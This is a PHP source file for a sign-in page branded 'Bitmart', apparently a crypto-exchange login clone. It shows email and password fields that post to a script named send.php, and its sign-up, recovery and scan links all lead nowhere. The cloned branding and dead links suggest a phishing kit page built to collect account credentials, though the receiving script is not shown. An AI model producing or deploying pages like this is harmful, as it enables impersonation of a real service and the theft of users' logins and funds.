<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'Bitmart | LogIn';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container my60'>
            <div class="row justify-content-center">
                <div class='col-sm-4 shadow rounded-2 p25 my60' style="position: relative">
                    <h1 class='h6 mobile_web_font fw-semibold pt10'>Sign In</h1>
                    <div style="position: absolute;top:0;right:3;"><i class="fa-solid fa-barcode fs50"></i></div>
                    <div class='py15'>Scan to sign in securely. <a href="#" class='text-primary-2 text-decoration-none'>Scan to sign in</a> </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <div class="my25">
                            <input name="email" type="email" required="" class="form-control form-control-add" placeholder="Email" value="" >
                        </div>
                        <div class="my25">
                            <input name="password" type="password" required="" minlength="3" class="form-control form-control-add" placeholder="Password" value="">
                        </div>
                        <div class="d-grid my25">
                            <button type="submit" class="btn btn-success btn-primary-2 py10" >Sign In</button>
                        </div>
                        <div class='row my25'>
                            <div class='col-sm-6'>
                                <a href="#" class='text-primary-2 text-decoration-none'>Forgot Password</a>
                            </div>
                            <div class='col-sm-6 text-end'>
                                <a href="#" class='text-primary-2 text-decoration-none'>Sign Up</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>